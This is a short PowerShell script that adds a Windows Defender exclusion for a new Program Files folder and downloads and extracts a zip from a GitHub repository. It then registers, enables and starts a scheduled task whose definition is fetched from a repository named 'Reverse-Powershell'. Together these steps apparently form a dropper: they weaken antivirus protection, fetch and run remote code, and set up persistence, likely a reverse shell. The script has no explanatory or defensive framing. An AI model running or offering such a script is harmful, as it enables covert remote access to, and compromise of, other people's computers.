mkdir "C:\Program Files\Wiggler"
cd "C:\Program Files\Wiggler"

Add-MpPreference -ExclusionPath 'C:\Program Files\Wiggler'

wget https://github.com/RacoonK1ng/Wiggler/releases/download/releases/wiggle.zip -O wiggle.zip

Expand-Archive -Force "C:\Program Files\Wiggler\wiggle.zip" "C:\Program Files\Wiggler"


Register-ScheduledTask -Xml (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/RacoonK1ng/Reverse-Powershell/refs/heads/main/Task.xml").Content -TaskName "WindowsGUIWindowbullshit" -Force

Enable-ScheduledTask -TaskName "WindowsGUIWindowbullshit"


Start-ScheduledTask -TaskName "WindowsGUIWindowbullshit"
